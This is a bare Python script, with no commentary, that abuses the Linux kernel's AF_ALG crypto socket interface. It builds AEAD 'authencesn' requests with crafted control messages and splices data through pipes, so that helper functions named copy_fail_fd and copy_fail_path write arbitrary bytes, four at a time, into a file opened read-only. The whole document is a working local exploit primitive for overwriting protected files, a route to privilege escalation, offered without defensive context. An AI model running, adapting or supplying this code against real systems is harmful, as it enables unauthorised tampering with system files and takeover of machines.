#!/usr/bin/env python3
import ctypes
import os

LEVEL = 279
AF_ALG = 38
SOCK_SEQPACKET = 5
MSG_MORE = 32768

libc = ctypes.CDLL(None, use_errno=True)


class IOVec(ctypes.Structure):
    _fields_ = [
        ("iov_base", ctypes.c_void_p),
        ("iov_len", ctypes.c_size_t),
    ]


class MsgHdr(ctypes.Structure):
    _fields_ = [
        ("msg_name", ctypes.c_void_p),
        ("msg_namelen", ctypes.c_uint),
        ("msg_iov", ctypes.POINTER(IOVec)),
        ("msg_iovlen", ctypes.c_size_t),
        ("msg_control", ctypes.c_void_p),
        ("msg_controllen", ctypes.c_size_t),
        ("msg_flags", ctypes.c_int),
    ]


class CMsgHdr(ctypes.Structure):
    _fields_ = [
        ("cmsg_len", ctypes.c_size_t),
        ("cmsg_level", ctypes.c_int),
        ("cmsg_type", ctypes.c_int),
    ]


def check(ret, name):
    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"{name}: {os.strerror(err)}")
    return ret


def align(n):
    mask = ctypes.sizeof(ctypes.c_size_t) - 1
    return (n + mask) & ~mask


def cmsg_len(data_len):
    return align(ctypes.sizeof(CMsgHdr)) + data_len


def cmsg_space(data_len):
    return align(ctypes.sizeof(CMsgHdr)) + align(data_len)


def alg_accept():
    fd = check(libc.socket(AF_ALG, SOCK_SEQPACKET, 0), "socket(AF_ALG)")
    try:
        sockaddr = (
            (AF_ALG).to_bytes(2, "little")
            + b"aead\0".ljust(14, b"\0")
            + (0).to_bytes(4, "little")
            + (0).to_bytes(4, "little")
            + b"authencesn(hmac(sha256),cbc(aes))\0".ljust(64, b"\0")
        )
        check(libc.bind(fd, sockaddr, len(sockaddr)), "bind(AF_ALG)")
        check(libc.setsockopt(fd, LEVEL, 1, bytes.fromhex("0800010000000010" + "0" * 64), 40), "setsockopt(AEAD_AUTHSIZE)")
        check(libc.setsockopt(fd, LEVEL, 5, None, 4), "setsockopt(AEAD_ASSOCLEN)")
        ufd = check(libc.accept(fd, None, None), "accept(AF_ALG)")
    except Exception:
        os.close(fd)
        raise

    return fd, ufd


def sendmsg_alg(fd, chunk):
    anc = [
        (LEVEL, 3, b"\0" * 4),
        (LEVEL, 2, b"\x10" + b"\0" * 19),
        (LEVEL, 4, b"\x08" + b"\0" * 3),
    ]

    data_bytes = b"A" * 4 + chunk
    data = ctypes.create_string_buffer(data_bytes, len(data_bytes))
    iov = IOVec(ctypes.cast(data, ctypes.c_void_p), len(data_bytes))

    control_len = sum(cmsg_space(len(item[2])) for item in anc)
    control = ctypes.create_string_buffer(control_len)
    base = ctypes.addressof(control)
    off = 0
    for level, ctype, cdata in anc:
        hdr = CMsgHdr.from_buffer(control, off)
        hdr.cmsg_len = cmsg_len(len(cdata))
        hdr.cmsg_level = level
        hdr.cmsg_type = ctype
        ctypes.memmove(base + off + align(ctypes.sizeof(CMsgHdr)), cdata, len(cdata))
        off += cmsg_space(len(cdata))

    msg = MsgHdr(
        None,
        0,
        ctypes.pointer(iov),
        1,
        ctypes.cast(control, ctypes.c_void_p),
        control_len,
        0,
    )
    check(libc.sendmsg(fd, ctypes.byref(msg), MSG_MORE), "sendmsg(AF_ALG)")


def write4(fd, offset, chunk):
    afd, ufd = alg_accept()
    try:
        o = offset + 4
        sendmsg_alg(ufd, chunk)
        r, w = os.pipe()
        try:
            os.splice(fd, w, o, offset_src=0)
            os.splice(r, ufd, o)
            try:
                os.read(ufd, 8 + offset)
            except OSError:
                pass
        finally:
            os.close(r)
            os.close(w)
    finally:
        os.close(ufd)
        os.close(afd)


def copy_fail_fd(fd, data, offset=0):
    for i in range(0, len(data), 4):
        write4(fd, offset + i, data[i : i + 4].ljust(4, b"\0"))


def copy_fail_path(path, data, offset=0):
    fd = os.open(path, os.O_RDONLY)
    try:
        copy_fail_fd(fd, data, offset)
    finally:
        os.close(fd)
